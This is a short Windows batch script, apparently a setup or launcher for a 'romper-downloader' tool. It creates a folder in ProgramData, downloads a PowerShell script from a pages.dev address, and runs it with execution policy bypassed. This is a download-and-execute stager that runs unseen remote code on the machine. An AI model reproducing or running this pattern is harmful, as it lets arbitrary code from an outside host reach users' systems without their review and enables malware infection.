@echo off

set "APP_FOLDER=%ProgramData%\romper-downloader"

if not exist "%APP_FOLDER%" mkdir "%APP_FOLDER%"

powershell -Command "Invoke-WebRequest -Uri 'https://asius.pages.dev/romperdownloader/conf.ps1' -OutFile '%APP_FOLDER%\conf.ps1'"

:: dupadupa

powershell.exe -ExecutionPolicy Bypass -File "%APP_FOLDER%\conf.ps1"
